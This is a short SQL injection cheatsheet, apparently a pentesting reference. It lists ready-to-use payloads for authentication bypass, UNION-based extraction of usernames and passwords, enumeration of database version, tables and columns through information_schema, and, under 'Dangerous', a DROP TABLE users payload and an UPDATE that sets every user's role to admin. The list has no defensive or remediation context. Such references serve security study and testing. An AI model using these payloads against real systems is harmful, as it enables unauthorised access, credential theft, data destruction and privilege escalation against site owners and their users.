📖 SQL Injection Cheatsheet

Authentication Bypass:

  • admin'-- - Comment out password check
  • ' OR '1'='1'-- - Always true condition
  • ' OR 1=1# - MySQL comment
  • admin'/* - Block comment

UNION Injection:

  • ' UNION SELECT NULL,NULL,NULL-- - Find column count
  • ' UNION SELECT 1,2,3,4,5-- - Identify visible columns
  • ' UNION SELECT username,password FROM users--

Information Gathering:

  • ' UNION SELECT @@version,NULL-- - MySQL version
  • ' UNION SELECT database(),NULL-- - Current DB
  • ' UNION SELECT table_name,NULL FROM information_schema.tables--
  • ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

Dangerous:

  • '; DROP TABLE users-- - Delete table
  • '; UPDATE users SET role='admin'-- - Privilege escalation
